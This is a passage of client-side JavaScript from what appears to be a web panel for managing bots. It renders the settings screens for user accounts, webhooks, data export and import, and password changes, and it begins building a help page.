      <button class="btn btn-primary" id="mcp-copy-config"><i class="ti ti-copy"></i>${esc(_t('mcpSettings.copyConfig'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.querySelector('#mcp-copy-config').onclick = () => {
    copyTextToClipboard(json).then(ok => {
      if (ok) toast('success', _t('common.copied'));
      else toast('error', _t('mcpSettings.copyFailed'), _t('mcpSettings.copyFailedHint'));
    });
  };
  ov.onclick = e => { if (e.target === ov) ov.remove(); };
}

function activateSettingsSection(id, btn) {
  App.currentSettingsSection = id;
  document.querySelectorAll('.settings-nav-item').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  document.querySelectorAll('.settings-section').forEach(s => s.classList.remove('active'));
  document.getElementById('section-' + id)?.classList.add('active');
  // Wire theme picker events when the appearance section becomes visible
  if (id === 'appearance' && window.NexusTheme) {
    window.NexusTheme.bindEvents();
  }
  if (id === 'language') {
    bindLanguagePicker('#settings-lang-picker');
  }
}

function showSettingsSection(id, btn) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const active = document.querySelector('#page-settings .settings-section.active');
  const activeId = active ? active.id.replace(/^section-/, '') : null;
  const dirtyGroups = activeId && activeId !== id ? dirtySettingsGroupsInSection(activeId) : [];
  if (dirtyGroups.length) {
    showUnsavedChangesDialog(() => {
      discardSettingsGroups(dirtyGroups);
      activateSettingsSection(id, btn);
    }, {
      desc: _t('settingsPage.unsavedSectionDesc'),
      leaveLabel: _t('settingsPage.unsavedSwitch')
    });
    return;
  }
  activateSettingsSection(id, btn);
}

// ------------------------------------------------------------
// USER ACCOUNTS (Settings > Users)
// ------------------------------------------------------------
let _usersCache = [];
let _usersBotsCache = [];

async function renderUsersPanel() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const panel = document.getElementById('users-panel');
  if (!panel) return;
  try {
    const [users, bots] = await Promise.all([NexusAPI.users.list(), NexusAPI.bots.list()]);
    if (!document.getElementById('users-panel')) return;
    _usersCache = users || [];
    _usersBotsCache = bots || [];
    const rows = _usersCache.map(user => {
      const isSelf = user.id === currentUser()?.id;
      const display = user.display_name || user.username;
      const avHtml = user.avatar ? avatarImageHtml(user.avatar, display) : esc(botInitials(display));
      const roleBadge = user.role === 'admin'
        ? `<span class="badge badge-blue">${esc(_t('usersSettings.roleAdmin'))}</span>`
        : `<span class="badge badge-amber">${esc(_t('usersSettings.roleUser'))}</span>`;
      const botLabel = user.role === 'admin'
        ? _t('usersSettings.allBots')
        : (user.allowed_bots || []).length
          ? user.allowed_bots.map(name => {
              const bot = _usersBotsCache.find(b => b.name === name);
              return esc(bot ? (bot.display_name || bot.name) : name);
            }).join(', ')
          : _t('usersSettings.noBots');
      return `<div class="user-row">
        <div class="user-row-av">${avHtml}</div>
        <div class="user-row-main">
          <div class="user-row-name">${esc(display)} ${isSelf ? `<span class="form-hint">(${esc(_t('usersSettings.you'))})</span>` : ''}</div>
          <div class="user-row-meta">@${esc(user.username)} · ${roleBadge}</div>
          <div class="user-row-bots"><i class="ti ti-robot"></i> ${botLabel}</div>
        </div>
        <div class="user-row-actions">
          <button class="btn btn-ghost btn-xs" onclick="showUserModal(${Number(user.id)})"><i class="ti ti-edit"></i>${esc(_t('common.edit'))}</button>
          <button class="btn btn-ghost btn-xs" onclick="showUserPasswordModal(${Number(user.id)})"><i class="ti ti-key"></i>${esc(_t('usersSettings.resetPassword'))}</button>
          ${isSelf ? '' : `<button class="btn btn-danger btn-xs btn-icon" onclick="deleteUserAccount(${Number(user.id)})" title="${esc(_t('common.delete'))}"><i class="ti ti-trash"></i></button>`}
        </div>
      </div>`;
    }).join('');

    panel.innerHTML = `<div class="card mb-16">
      <div class="card-header">
        <span class="card-title"><i class="ti ti-users"></i>${esc(_t('usersSettings.title'))}</span>
        <button class="btn btn-primary btn-sm" onclick="showUserModal()"><i class="ti ti-plus"></i>${esc(_t('usersSettings.newUser'))}</button>
      </div>
      <div class="card-body" style="padding:0;">
        ${rows || `<div class="empty-state" style="padding:26px;"><i class="ti ti-users"></i><span style="color:var(--tx-3);font-size:12px;">${esc(_t('usersSettings.empty'))}</span></div>`}
      </div>
    </div>
    <p class="form-hint"><i class="ti ti-info-circle"></i>${esc(_t('usersSettings.hint'))}</p>`;
  } catch (e) {
    panel.innerHTML = `<div class="card"><div class="card-body" style="color:var(--red);">${esc(e.message)}</div></div>`;
  }
}

function userById(id) {
  return _usersCache.find(u => u.id === Number(id)) || null;
}

function closeUserModal() {
  document.getElementById('user-modal')?.remove();
}

function showUserModal(id = null) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  closeUserModal();
  const editing = id !== null && id !== undefined;
  const user = editing ? userById(id) : null;
  if (editing && !user) return;
  const allowed = new Set(user?.allowed_bots || []);
  const isSelf = editing && user.id === currentUser()?.id;
  const role = user?.role || 'user';

  const bots = _usersBotsCache.map(bot => `
    <label class="user-bot-option">
      <input type="checkbox" class="user-bot-check" value="${esc(bot.name)}"${allowed.has(bot.name) ? ' checked' : ''}/>
      <span>${esc(bot.display_name || bot.name)} <span class="form-hint">@${esc(bot.name)}</span></span>
    </label>`).join('');

  const ov = document.createElement('div');
  ov.id = 'user-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal" style="max-width:640px;">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-users"></i>${esc(editing ? _t('usersSettings.editTitle') : _t('usersSettings.createTitle'))}</span>
      <button class="btn-close" onclick="closeUserModal()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <div class="grid-2">
        <div class="form-group">
          <label class="form-label">${esc(_t('usersSettings.username'))}</label>
          <input class="form-control mono" id="user-username" maxlength="64" value="${esc(user?.username || '')}" ${editing ? 'disabled' : ''} autocomplete="off"/>
          ${editing ? '' : `<div class="form-hint">${esc(_t('usersSettings.usernameHint'))}</div>`}
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('usersSettings.displayName'))}</label>
          <input class="form-control" id="user-display-name" maxlength="80" value="${esc(user?.display_name || user?.username || '')}"/>
        </div>
      </div>
      ${editing ? '' : `<div class="grid-2">
        <div class="form-group">
          <label class="form-label">${esc(_t('usersSettings.password'))}</label>
          <input class="form-control" id="user-password" type="password" maxlength="72" autocomplete="new-password"/>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('usersSettings.confirmPassword'))}</label>
          <input class="form-control" id="user-password2" type="password" maxlength="72" autocomplete="new-password"/>
        </div>
      </div>`}
      <div class="form-group">
        <label class="form-label">${esc(_t('usersSettings.role'))}</label>
        <select class="form-control" id="user-role" onchange="toggleUserBotsGroup()" ${isSelf ? 'disabled' : ''}>
          <option value="user"${role === 'user' ? ' selected' : ''}>${esc(_t('usersSettings.roleUser'))}</option>
          <option value="admin"${role === 'admin' ? ' selected' : ''}>${esc(_t('usersSettings.roleAdmin'))}</option>
        </select>
        <div class="form-hint">${esc(_t('usersSettings.roleHint'))}</div>
      </div>
      <div class="form-group" id="user-bots-group"${role === 'user' ? '' : ' style="display:none;"'}>
        <label class="form-label">${esc(_t('usersSettings.allowedBots'))}</label>
        <div class="user-bot-list">${bots || `<span class="form-hint">${esc(_t('usersSettings.noBotAvailable'))}</span>`}</div>
        <div class="form-hint">${esc(_t('usersSettings.allowedBotsHint'))}</div>
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeUserModal()">${esc(_t('common.cancel'))}</button>
      <button class="btn btn-primary" id="user-save" onclick="saveUserModal(${editing ? Number(user.id) : 'null'})"><i class="ti ti-device-floppy"></i>${esc(editing ? _t('common.save') : _t('usersSettings.create'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) closeUserModal(); };
}

function toggleUserBotsGroup() {
  const role = document.getElementById('user-role')?.value;
  const group = document.getElementById('user-bots-group');
  if (group) group.style.display = role === 'user' ? '' : 'none';
}

async function saveUserModal(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const editing = id !== null && id !== undefined;
  const btn = document.getElementById('user-save');
  const username = document.getElementById('user-username')?.value?.trim();
  const displayName = document.getElementById('user-display-name')?.value?.trim();
  const role = document.getElementById('user-role')?.value || 'user';
  const allowedBots = Array.from(document.querySelectorAll('.user-bot-check:checked')).map(el => el.value);

  const body = {
    display_name: displayName,
    role,
    allowed_bots: role === 'user' ? allowedBots : []
  };
  if (!editing) {
    const password = document.getElementById('user-password')?.value;
    const confirm = document.getElementById('user-password2')?.value;
    if (!username || username.length < 3) { toast('error', _t('usersSettings.usernameHint')); return; }
    if (!password || password.length < 8) { toast('error', _t('usersSettings.passwordShort')); return; }
    if (password !== confirm) { toast('error', _t('usersSettings.passwordMismatch')); return; }
    body.username = username;
    body.password = password;
  }
  if (!displayName) { toast('error', _t('usersSettings.displayNameMissing')); return; }

  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-sm"></span>'; }
  try {
    const updated = editing
      ? await NexusAPI.users.update(id, body)
      : await NexusAPI.users.create(body);
    if (editing && updated.id === currentUser()?.id) {
      applyUserProfile({ ...(currentUser() || {}), ...updated });
    }
    closeUserModal();
    await renderUsersPanel();
    toast('success', editing ? _t('usersSettings.updated') : _t('usersSettings.created'));
  } catch (e) {
    toast('error', _t('usersSettings.saveError'), e.message);
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(editing ? _t('common.save') : _t('usersSettings.create'))}`; }
  }
}

function showUserPasswordModal(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const user = userById(id);
  if (!user) return;
  document.getElementById('user-password-modal')?.remove();
  const ov = document.createElement('div');
  ov.id = 'user-password-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal modal-sm">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-key"></i>${esc(_t('usersSettings.resetTitle'))}</span>
      <button class="btn-close" onclick="this.closest('.modal-overlay').remove()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <p class="form-hint" style="margin-bottom:12px;">${esc(_t('usersSettings.resetDesc', { name: user.username }))}</p>
      <div class="form-group">
        <label class="form-label">${esc(_t('usersSettings.newPassword'))}</label>
        <input class="form-control" id="reset-password" type="password" maxlength="72" autocomplete="new-password"/>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(_t('usersSettings.confirmPassword'))}</label>
        <input class="form-control" id="reset-password2" type="password" maxlength="72" autocomplete="new-password"/>
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="this.closest('.modal-overlay').remove()">${esc(_t('common.cancel'))}</button>
      <button class="btn btn-primary" id="reset-save" onclick="saveUserPassword(${Number(id)})"><i class="ti ti-key"></i>${esc(_t('usersSettings.resetPassword'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) ov.remove(); };
}

async function saveUserPassword(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const password = document.getElementById('reset-password')?.value;
  const confirm = document.getElementById('reset-password2')?.value;
  if (!password || password.length < 8) { toast('error', _t('usersSettings.passwordShort')); return; }
  if (password !== confirm) { toast('error', _t('usersSettings.passwordMismatch')); return; }
  const btn = document.getElementById('reset-save');
  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-sm"></span>'; }
  try {
    await NexusAPI.users.resetPassword(id, password);
    document.getElementById('user-password-modal')?.remove();
    toast('success', _t('usersSettings.resetOk'));
  } catch (e) {
    toast('error', _t('usersSettings.saveError'), e.message);
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-key"></i>${esc(_t('usersSettings.resetPassword'))}`; }
  }
}

function deleteUserAccount(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const user = userById(id);
  if (!user) return;
  confirm(_t('usersSettings.deleteTitle'), _t('usersSettings.deleteDesc', { name: user.username }), async () => {
    try {
      await NexusAPI.users.delete(id);
      await renderUsersPanel();
      toast('success', _t('usersSettings.deleted'));
    } catch (e) {
      toast('error', _t('usersSettings.saveError'), e.message);
    }
  });
}

// ------------------------------------------------------------
// WEBHOOKS (Settings > Webhooks)
// ------------------------------------------------------------
let _webhooksCache = [];
let _webhookEventGroups = [];

function webhookEventLabel(event) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const key = `webhookEvents.${event}`;
  const label = _t(key);
  return label === key ? String(event || '').replace(/_/g, ' ') : label;
}

async function renderWebhooksPanel() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const panel = document.getElementById('webhooks-panel');
  if (!panel) return;
  try {
    const [hooks, events] = await Promise.all([NexusAPI.webhooks.list(), NexusAPI.webhooks.events()]);
    if (!document.getElementById('webhooks-panel')) return;
    _webhooksCache = hooks || [];
    _webhookEventGroups = (events && events.groups) || [];

    const rows = _webhooksCache.map(hook => {
      const last = hook.last_delivery_at
        ? `${fmtDate(hook.last_delivery_at)} · ${hook.last_error ? esc(hook.last_error) : (hook.last_status ? `HTTP ${hook.last_status}` : '—')}`
        : _t('webhooks.never');
      return `<div class="user-row">
        <div class="user-row-av" style="background:${hook.enabled ? 'var(--blue-bg)' : 'var(--gray-bg)'};color:${hook.enabled ? 'var(--blue)' : 'var(--tx-3)'};"><i class="ti ti-webhook"></i></div>
        <div class="user-row-main">
          <div class="user-row-name">${esc(hook.name)} ${hook.enabled ? `<span class="badge badge-online">${esc(_t('webhooks.enabled'))}</span>` : `<span class="badge badge-unknown">${esc(_t('webhooks.disabled'))}</span>`}</div>
          <div class="user-row-meta" style="word-break:break-all;">${esc(hook.url)}</div>
          <div class="user-row-bots"><i class="ti ti-bolt"></i> ${esc(_t('webhooks.eventCount', { n: (hook.events || []).length }))} · ${esc(_t('webhooks.format_' + (hook.format || 'auto')))} · ${esc(_t('webhooks.lastDelivery'))}: ${esc(last)}</div>
        </div>
        <div class="user-row-actions">
          <button class="btn btn-ghost btn-xs" onclick="testWebhookDelivery(${Number(hook.id)})"><i class="ti ti-send"></i>${esc(_t('webhooks.test'))}</button>
          <button class="btn btn-ghost btn-xs" onclick="showWebhookModal(${Number(hook.id)})"><i class="ti ti-edit"></i>${esc(_t('common.edit'))}</button>
          <button class="btn btn-danger btn-xs btn-icon" onclick="deleteWebhook(${Number(hook.id)})" title="${esc(_t('common.delete'))}"><i class="ti ti-trash"></i></button>
        </div>
      </div>`;
    }).join('');

    panel.innerHTML = `<div class="card mb-16">
      <div class="card-header">
        <span class="card-title"><i class="ti ti-webhook"></i>${esc(_t('webhooks.title'))}</span>
        <button class="btn btn-primary btn-sm" onclick="showWebhookModal()"><i class="ti ti-plus"></i>${esc(_t('webhooks.new'))}</button>
      </div>
      <div class="card-body" style="padding:0;">
        ${rows || `<div class="empty-state" style="padding:26px;"><i class="ti ti-webhook"></i><span style="color:var(--tx-3);font-size:12px;">${esc(_t('webhooks.empty'))}</span></div>`}
      </div>
    </div>
    <p class="form-hint"><i class="ti ti-info-circle"></i>${esc(_t('webhooks.hint'))}</p>`;
  } catch (e) {
    panel.innerHTML = `<div class="card"><div class="card-body" style="color:var(--red);">${esc(e.message)}</div></div>`;
  }
}

function webhookById(id) {
  return _webhooksCache.find(hook => hook.id === Number(id)) || null;
}

function closeWebhookModal() {
  document.getElementById('webhook-modal')?.remove();
}

function showWebhookModal(id = null) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  closeWebhookModal();
  const editing = id !== null && id !== undefined;
  const hook = editing ? webhookById(id) : null;
  if (editing && !hook) return;
  const selected = new Set(hook?.events || []);

  const groupsHtml = _webhookEventGroups.map(group => `
    <div class="webhook-event-group">
      <div class="webhook-event-group-title">${esc(_t('webhookGroups.' + group.id))}</div>
      <div class="webhook-event-grid">
        ${group.events.map(event => `<label class="user-bot-option"><input type="checkbox" class="webhook-event-check" value="${esc(event)}"${selected.has(event) ? ' checked' : ''}/><span>${esc(webhookEventLabel(event))}</span></label>`).join('')}
      </div>
    </div>`).join('');

  const ov = document.createElement('div');
  ov.id = 'webhook-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal" style="max-width:760px;">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ti-webhook"></i>${esc(editing ? _t('webhooks.editTitle') : _t('webhooks.createTitle'))}</span>
      <button class="btn-close" onclick="closeWebhookModal()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <div class="grid-2">
        <div class="form-group">
          <label class="form-label">${esc(_t('webhooks.name'))}</label>
          <input class="form-control" id="webhook-name" maxlength="80" value="${esc(hook?.name || '')}" placeholder="${esc(_t('webhooks.namePh'))}"/>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(_t('webhooks.url'))}</label>
          <input class="form-control mono" id="webhook-url" maxlength="2000" value="${esc(hook?.url || '')}" placeholder="https://example.com/hook"/>
        </div>
      </div>
      <div class="grid-2">
        <div class="form-group">
          <label class="form-label">${esc(_t('webhooks.format'))}</label>
          <select class="form-control" id="webhook-format">
            ${['auto', 'json', 'discord', 'slack'].map(fmt => `<option value="${fmt}"${(hook?.format || 'auto') === fmt ? ' selected' : ''}>${esc(_t('webhooks.format_' + fmt))}</option>`).join('')}
          </select>
          <div class="form-hint">${esc(_t('webhooks.formatHint'))}</div>
        </div>
        <div class="form-group" style="justify-content:flex-end;display:flex;">
          <label class="toggle" style="margin-top:8px;">
            <input type="checkbox" id="webhook-enabled" ${hook?.enabled !== false ? 'checked' : ''}/>
            <span class="toggle-label">${esc(_t('webhooks.enabledLabel'))}</span>
          </label>
        </div>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(_t('webhooks.events'))}</label>
        <div class="webhook-events">${groupsHtml}</div>
        <div class="form-hint">${esc(_t('webhooks.eventsHint'))}</div>
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeWebhookModal()">${esc(_t('common.cancel'))}</button>
      <button class="btn btn-primary" id="webhook-save" onclick="saveWebhookModal(${editing ? Number(hook.id) : 'null'})"><i class="ti ti-device-floppy"></i>${esc(editing ? _t('common.save') : _t('webhooks.create'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) closeWebhookModal(); };
}

async function saveWebhookModal(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const editing = id !== null && id !== undefined;
  const name = document.getElementById('webhook-name')?.value?.trim();
  const url = document.getElementById('webhook-url')?.value?.trim();
  const enabled = !!document.getElementById('webhook-enabled')?.checked;
  const format = document.getElementById('webhook-format')?.value || 'auto';
  const events = Array.from(document.querySelectorAll('.webhook-event-check:checked')).map(el => el.value);
  if (!name) { toast('error', _t('webhooks.nameMissing')); return; }
  if (!/^https?:\/\//i.test(url || '')) { toast('error', _t('webhooks.urlInvalid')); return; }
  if (!events.length) { toast('error', _t('webhooks.eventsMissing')); return; }

  const btn = document.getElementById('webhook-save');
  if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spinner spinner-sm"></span>'; }
  try {
    if (editing) await NexusAPI.webhooks.update(id, { name, url, enabled, format, events });
    else await NexusAPI.webhooks.create({ name, url, enabled, format, events });
    closeWebhookModal();
    await renderWebhooksPanel();
    toast('success', editing ? _t('webhooks.updated') : _t('webhooks.created'));
  } catch (e) {
    toast('error', _t('webhooks.saveError'), e.message);
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(editing ? _t('common.save') : _t('webhooks.create'))}`; }
  }
}

async function testWebhookDelivery(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    await NexusAPI.webhooks.test(id);
    toast('success', _t('webhooks.testOk'), _t('webhooks.testOkHint'));
  } catch (e) {
    toast('error', _t('webhooks.testError'), e.message);
  }
  await renderWebhooksPanel();
}

function deleteWebhook(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const hook = webhookById(id);
  if (!hook) return;
  confirm(_t('webhooks.deleteTitle'), _t('webhooks.deleteDesc', { name: hook.name }), async () => {
    try {
      await NexusAPI.webhooks.delete(id);
      await renderWebhooksPanel();
      toast('success', _t('webhooks.deleted'));
    } catch (e) {
      toast('error', _t('webhooks.saveError'), e.message);
    }
  });
}

// ------------------------------------------------------------
// PANEL EXPORTS (Settings > Export)
// ------------------------------------------------------------
async function downloadPanelExport(kind) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    const res = kind === 'full' ? await NexusAPI.exportData.full() : await NexusAPI.exportData.settings();
    if (!res.ok) {
      let message = `HTTP ${res.status}`;
      try { message = (await res.json()).error || message; } catch (_) {}
      throw new Error(message);
    }
    const blob = await res.blob();
    const cd = res.headers.get('content-disposition') || '';
    const filename = cd.match(/filename="([^"]+)"/)?.[1]
      || (kind === 'full' ? 'nexus-full-backup.zip' : 'nexus-settings.json');
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    a.click();
    URL.revokeObjectURL(a.href);
    toast('success', _t('exportSettings.done'), filename);
  } catch (e) {
    toast('error', _t('exportSettings.error'), e.message);
  }
}

function confirmFullExport() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('exportSettings.fullConfirmTitle'), _t('exportSettings.fullConfirmDesc'), () => downloadPanelExport('full'));
}

async function importSettingsFile(input) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const file = input.files && input.files[0];
  input.value = '';
  if (!file) return;
  toast('info', _t('exportSettings.importing'));
  try {
    const result = await NexusAPI.exportData.importSettings(file);
    const s = result.summary || {};
    toast('success', _t('exportSettings.importSettingsDone'),
      _t('exportSettings.importSettingsSummary', {
        users: s.usersUpdated || 0,
        bots: s.botsUpdated || 0,
        webhooks: s.webhooksImported || 0
      }));
    App.suppressUnloadGuard = true;
    setTimeout(() => location.reload(), 1200);
  } catch (e) {
    toast('error', _t('exportSettings.importError'), e.message);
  }
}

function confirmFullImport(input) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const file = input.files && input.files[0];
  input.value = '';
  if (!file) return;
  confirm(_t('exportSettings.importFullConfirmTitle'), _t('exportSettings.importFullConfirmDesc'), async () => {
    toast('info', _t('exportSettings.importing'));
    try {
      await NexusAPI.exportData.importFull(file);
      toast('success', _t('exportSettings.importFullDone'), _t('exportSettings.importFullHint2'));
      App.suppressUnloadGuard = true;
      setTimeout(() => location.reload(), 1500);
    } catch (e) {
      toast('error', _t('exportSettings.importError'), e.message);
    }
  });
}

async function saveGeneralSettings() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const name = document.getElementById('s-name')?.value?.trim();
  if (!name) { toast('warning', _t('toasts.nameMissing')); return; }
  try {
    await NexusAPI.system.updateSettings({ instance_name: name });
    App.instanceName = name;
    updateInstanceName(name);
    markSettingsGroupsClean(['general-name']);
    refreshSettingsGroupsSnapshot(['general-name']);
    toast('success', _t('toasts.settingsSaved'));
  } catch (e) { toast('error', _t('toasts.error'), e.message); }
}

async function saveBotSettings() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    await NexusAPI.system.updateSettings({
      bot_autorestart: document.getElementById('s-autorestart')?.checked,
      bot_max_restarts: parseInt(document.getElementById('s-maxrestart')?.value) || 5
    });
    markSettingsGroupsClean(['general-bots']);
    refreshSettingsGroupsSnapshot(['general-bots']);
    toast('success', _t('toasts.botsSettingsSaved'));
  } catch (e) { toast('error', _t('toasts.error'), e.message); }
}

async function saveAdvancedSettings() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    await NexusAPI.system.updateSettings({
      monitoring_interval: parseInt(document.getElementById('s-monint')?.value) || 5,
      notifications_enabled: document.getElementById('s-notif')?.checked
    });
    markSettingsGroupsClean(['bots-cfg']);
    refreshSettingsGroupsSnapshot(['bots-cfg']);
    toast('success', _t('toasts.advancedSaved'));
  } catch (e) { toast('error', _t('toasts.error'), e.message); }
}

async function changePassword() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const cur = document.getElementById('s-curpwd')?.value;
  const nw  = document.getElementById('s-newpwd')?.value;
  const cf  = document.getElementById('s-cfpwd')?.value;
  if (!cur || !nw)   { toast('error', _t('toasts.missingFields')); return; }
  if (nw !== cf)     { toast('error', _t('toasts.pwdMismatch')); return; }
  if (nw.length < 8) { toast('error', _t('toasts.pwdTooShort')); return; }
  try {
    await NexusAPI.auth.changePassword(cur, nw);
    markSettingsGroupsClean(['account']);
    toast('success', _t('toasts.pwdChanged'));
    ['s-curpwd','s-newpwd','s-cfpwd'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
    // The server revokes every token on password change, including this one:
    // drop the local session now instead of letting the next API call 401.
    await doLogout();
  } catch (e) { toast('error', _t('toasts.error'), e.message); }
}

// ------------------------------------------------------------
// HELP / À PROPOS PAGE
// ------------------------------------------------------------
async function loadHelp() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-help');
  if (!page) return;
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  try {
    const sys = isAdmin()
      ? await NexusAPI.system.info().catch(() => App.systemInfo || {})
      : (App.systemInfo || {});

    page.innerHTML = `
      <div class="section-title mb-16"><i class="ti ti-lifebuoy"></i>${esc(_t('helpPage.title'))}</div>
      <div class="flex-between mb-16">
        <div>
          <div style="font-size:12px;color:var(--tx-3);">${esc(_t('helpPage.subtitle'))}</div>
        </div>
      </div>

      <!-- Présentation -->
      <div class="card" style="margin-bottom:16px;">
        <div class="card-header"><span class="card-title"><i class="ti ti-info-circle"></i>${esc(_t('helpPage.about'))}</span></div>
        <div class="card-body">
          <p style="font-size:13px;color:var(--tx-2);line-height:1.65;margin-bottom:12px;">
            ${_t('helpPage.aboutDesc')}
          </p>
          <p style="font-size:12px;color:var(--tx-3);line-height:1.65;">
            ${_t('helpPage.aboutDesc2')}
          </p>
        </div>
      </div>

      <!-- Démarrage rapide -->
      <div class="card" style="margin-bottom:16px;">
        <div class="card-header"><span class="card-title"><i class="ti ti-rocket"></i>${esc(_t('helpPage.quickStart'))}</span></div>
        <div class="card-body" style="padding:0;">
          <div class="help-step">
            <div class="help-step-num">1</div>
            <div class="help-step-body">
              <strong>${esc(_t('helpPage.step1Title'))}</strong>
              <span>${_t('helpPage.step1Desc')}</span>
            </div>
          </div>
          <div class="help-step">
            <div class="help-step-num">2</div>
            <div class="help-step-body">
              <strong>${esc(_t('helpPage.step2Title'))}</strong>
              <span>${_t('helpPage.step2Desc')}</span>
            </div>
          </div>
          <div class="help-step">
            <div class="help-step-num">3</div>
            <div class="help-step-body">
              <strong>${esc(_t('helpPage.step3Title'))}</strong>
              <span>${_t('helpPage.step3Desc')}</span>
            </div>
          </div>
          <div class="help-step">
            <div class="help-step-num">4</div>
            <div class="help-step-body">
              <strong>${esc(_t('helpPage.step4Title'))}</strong>
              <span>${_t('helpPage.step4Desc')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Liens -->
      <div class="card" style="margin-bottom:16px;">
        <div class="card-header"><span class="card-title"><i class="ti ti-link"></i>${esc(_t('helpPage.resources'))}</span></div>
        <div class="card-body" style="padding:0;">
          <a href="https://nexus.dj-julien.fr/" target="_blank" rel="noopener" class="link-row">
            <i class="ti ti-world" style="color:var(--blue);"></i>
            <div class="link-row-text"><strong>${esc(_t('helpPage.site'))}</strong><span>${esc(_t('helpPage.siteDesc'))}</span></div>
            <i class="ti ti-external-link link-row-arrow"></i>
          </a>
          <a href="https://nexus.dj-julien.fr/docs.html" target="_blank" rel="noopener" class="link-row">
            <i class="ti ti-book" style="color:var(--green);"></i>
            <div class="link-row-text"><strong>${esc(_t('helpPage.docs'))}</strong><span>${esc(_t('helpPage.docsDesc'))}</span></div>
            <i class="ti ti-external-link link-row-arrow"></i>
          </a>
          <a href="https://nexus.dj-julien.fr/changelog.html" target="_blank" rel="noopener" class="link-row">
            <i class="ti ti-history" style="color:var(--amber);"></i>
            <div class="link-row-text"><strong>${esc(_t('helpPage.changelog'))}</strong><span>${esc(_t('helpPage.changelogDesc'))}</span></div>
            <i class="ti ti-external-link link-row-arrow"></i>
          </a>
          <a href="https://github.com/Julien48003/nexus-bot-manager" target="_blank" rel="noopener" class="link-row">
            <i class="ti ti-brand-github" style="color:var(--tx-1);"></i>
            <div class="link-row-text"><strong>${esc(_t('helpPage.github'))}</strong><span>${esc(_t('helpPage.githubDesc'))}</span></div>
            <i class="ti ti-external-link link-row-arrow"></i>
          </a>
          <a href="https://github.com/Julien48003/nexus-bot-manager/issues" target="_blank" rel="noopener" class="link-row">
            <i class="ti ti-bug" style="color:var(--red);"></i>
            <div class="link-row-text"><strong>${esc(_t('helpPage.reportBug'))}</strong><span>${esc(_t('helpPage.reportBugDesc'))}</span></div>
            <i class="ti ti-external-link link-row-arrow"></i>
          </a>
        </div>
      </div>

      <!-- FAQ -->
      <div class="card" style="margin-bottom:16px;">
        <div class="card-header"><span class="card-title"><i class="ti ti-help"></i>${esc(_t('helpPage.faq'))}</span></div>
        <div class="card-body">
          <details class="faq-item" open>
            <summary><strong>${esc(_t('helpPage.faq1Title'))}</strong></summary>
            <p>${_t('helpPage.faq1Body')}</p>
          </details>
          <details class="faq-item">
